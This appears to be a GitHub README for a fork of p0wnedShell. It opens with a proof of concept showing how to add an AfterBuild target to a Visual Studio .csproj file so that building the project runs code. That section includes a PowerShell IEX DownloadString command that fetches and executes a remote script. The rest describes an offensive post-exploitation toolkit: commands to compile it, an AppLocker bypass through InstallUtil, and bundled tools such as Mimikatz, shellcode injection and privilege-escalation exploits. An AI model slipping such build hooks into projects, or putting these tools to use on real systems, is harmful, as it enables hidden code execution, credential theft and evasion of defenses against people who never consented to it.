# p0wnedShell-DarkVersion
###Add my  POC to test Visual Studio trick to run code when building  

Author: 3gstudent


License: BSD 3-Clause


- Test Success on Visual Studio 2008 and later.

- All Visual Studio project include c++ c# vb and vf# can use this.

###Usage:

Download the code and build it :) 

Miracle happened :)


###Reference :

http://thomasardal.com/msbuild-tutorial/

https://msdn.microsoft.com/en-us/library/ms366724.aspx

###Details:

When I study the details about MSbuild Tasks,I produced an idea：


Could I change a normal C# project to run code when building?


I'm lucky that I've noticed the details about .csproj file and I have achieved my goal immediately:)


At the end of the .csproj file,there is a detail:
```
<!-- To modify your build process, add your task inside one of the targets below and uncomment it. 
       Other similar extension points exist, see Microsoft.Common.targets.
  <Target Name="BeforeBuild">
  </Target>
  <Target Name="AfterBuild">
  </Target>
  -->

```
So I change this and add the following code:

```
<Target Name="AfterBuild">
    <Exec Command="calc.exe"/>
  </Target>

```
Success to run calc.exe,but the build blocked.Like this:


![Alt text](http://static.wooyun.org/upload/image/201606/2016060310195961687.gif "gif1")


####Solution:


We need powershell.


Update my ps script:

https://github.com/3gstudent/test/blob/master/calc.ps1


Use the DownloadString of Powershell,code is:
```
<Target Name="AfterBuild">
    <Exec Command="powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/3gstudent/test/master/calc.ps1');"/>
  </Target>
```  


Then,we made it.























---

PowerShell Runspace Post Exploitation Toolkit 

![Alt text](/p0wnedShell/p0wnedShell.ico?raw=true "p0wnedShell")

### Author: Cn33liz and Skons

License: BSD 3-Clause

### What is it:

p0wnedShell is an offensive PowerShell host application written in C# that does not rely on powershell.exe but runs powershell commands and functions within a powershell runspace environment (.NET). It has a lot of offensive PowerShell modules and binaries included to make the process of Post Exploitation easier.
What we tried was to build an “all in one” Post Exploitation tool which we could use to bypass all mitigations solutions (or at least some off), and that has all relevant tooling included. 
You can use it to perform modern attacks within Active Directory environments and create awareness within your Blue team so they can build the right defense strategies.

### How to Compile it:

To compile p0wnedShell you need to import this project within Microsoft Visual Studio or if you don't have access to a Visual Studio installation, you can compile it as follows:

To Compile as x86 binary:

```
cd \Windows\Microsoft.NET\Framework\v4.0.30319

csc.exe /unsafe /reference:"C:\p0wnedShell\System.Management.Automation.dll" /reference:System.IO.Compression.dll /win32icon:C:\p0wnedShell\p0wnedShell.ico /out:C:\p0wnedShell\p0wnedShellx86.exe /platform:x86 "C:\p0wnedShell\*.cs"
```

To Compile as x64 binary:

```
cd \Windows\Microsoft.NET\Framework64\v4.0.30319

csc.exe /unsafe /reference:"C:\p0wnedShell\System.Management.Automation.dll" /reference:System.IO.Compression.dll /win32icon:C:\p0wnedShell\p0wnedShell.ico /out:C:\p0wnedShell\p0wnedShellx64.exe /platform:x64 "C:\p0wnedShell\*.cs"
```

p0wnedShell uses the System.Management.Automation namespace, so make sure you have the System.Management.Automation.dll within your source path when compiling outside of Visual Studio.

### How to use it:

Just run the executables or...

To run as x86 binary and bypass Applocker (Credits for this great bypass go to Casey Smith aka subTee):

```
cd \Windows\Microsoft.NET\Framework\v4.0.30319 (Or newer .NET version folder)

InstallUtil.exe /logfile= /LogToConsole=false /U C:\p0wnedShell\p0wnedShellx86.exe
```

To run as x64 binary and bypass Applocker:

```
cd \Windows\Microsoft.NET\Framework64\v4.0.30319 (Or newer .NET version folder)

InstallUtil.exe /logfile= /LogToConsole=false /U C:\p0wnedShell\p0wnedShellx64.exe
```

### What's inside the runspace:

#### The following PowerShell tools/functions are included:

* PowerSploit Invoke-Shellcode
* PowerSploit Invoke-ReflectivePEInjection
* PowerSploit Invoke-Mimikatz
* PowerSploit Invoke-TokenManipulation
* PowerSploit PowerUp
* PowerSploit PowerView
* HarmJ0y's Invoke-Psexec
* Besimorhino's PowerCat
* Nishang Invoke-PsUACme
* Nishang Invoke-Encode
* Nishang Get-PassHashes
* Nishang Invoke-CredentialsPhish
* Nishang Port-Scan
* Nishang Copy-VSS
* Kevin Robertson Invoke-Inveigh
* Kevin Robertson Tater
* FuzzySecurity Invoke-MS16-032

Powershell functions within the Runspace are loaded in memory from
[Base64 encode strings](https://github.com/Cn33liz/p0wnedShell/blob/master/Utilities/PS1ToBase64.ps1).

#### The following Binaries/tools are included:

* Benjamin DELPY's Mimikatz
* Benjamin DELPY's MS14-068 kekeo Exploit
* Didier Stevens modification of ReactOS Command Prompt
* MS14-058 Local SYSTEM Exploit
* hfiref0x MS15-051 Local SYSTEM Exploit

Binaries are loaded in memory using ReflectivePEInjection (Byte arrays are compressed using Gzip and saved within p0wnedShell as [Base64 encoded strings](https://github.com/Cn33liz/p0wnedShell/blob/master/Utilities/CompressString.cs)).

### Shout-outs:

p0wnedshell is heavily based on tools and knowledge from people like harmj0y, the guys from Powersploit, Sean Metcalf, SubTee, Nikhil Mittal, Besimorhino, Benjamin Delpy, Breenmachine, FoxGlove Security, Kevin Robertson, FuzzySecurity, James Forshaw and anyone else i forgot. So shout-outs go to them and of course to our friends in Redmond for giving us access to a very powerfull hacking language.

### Todo:

* Tab completion within the shell using TabExpansion2.
* More attacks (Overpass-the-hash, Kerberos Silver Tickets e.g.)

### Contact:

To report an issue or request a feature, feel free to contact me at:
Cornelis ```at``` dePlaa.com or [@Cn33lis](https://twitter.com/Cneelis)

